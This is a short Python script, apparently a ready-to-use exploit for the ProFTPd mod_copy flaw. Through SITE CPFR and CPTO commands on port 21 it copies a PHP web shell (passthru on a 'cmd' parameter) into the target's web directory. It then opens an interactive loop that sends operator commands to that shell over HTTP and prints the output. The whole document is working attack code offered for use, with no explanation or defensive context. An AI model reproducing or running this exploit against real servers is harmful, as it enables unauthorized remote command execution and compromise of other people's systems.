import requests,argparse,socket

parser = argparse.ArgumentParser()
parser.add_argument("--rhost","-r",help="The target HOST, example: 127.0.0.1",type=str,required=True)
parser.add_argument("--sitepath","-sp",help="Path to the directory",type=str,required=True)
args = parser.parse_args()

def exploit(rhost,path):
    print ("-----ProFTPd modcopy RCE-----")
    sitepath = path
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((rhost,21))
    banner = sock.recv(128)
    print ("[+] Connecting to FTP server")
    print (banner.decode())
    print ("[+] Sending copy commands to FTP server")
    sock.send(b'site cpfr /proc/self/cmdline\r\n\r\n')
    print (sock.recv(1024).decode())
    sock.send(b'site cpto <?php passthru($_GET[\'cmd\']);?>\r\n')
    print (sock.recv(1024).decode())
    sock.send(b'site cpfr <?php passthru($_GET[\'cmd\']);?>\r\n')
    print (sock.recv(1024).decode())
    sock.send(bytes('site cpto {}/asdr.php'.format(path),encoding='utf8'))
    print (sock.recv(1024).decode())
    sock.close()

def request(rhost):
    host = (f"http://{rhost}/asdr.php?cmd=")
    print (f"[+] Command execution in {host}")
    while True:
        cmd = (input("Command: "))
        param = {"cmd":cmd}
        r = requests.get(host,params=param)
        if (r.status_code == 200):
            print (r.text.split('cpto ')[1])
        else:
            pass
print (exploit(args.rhost,args.sitepath))
print (request(args.rhost))
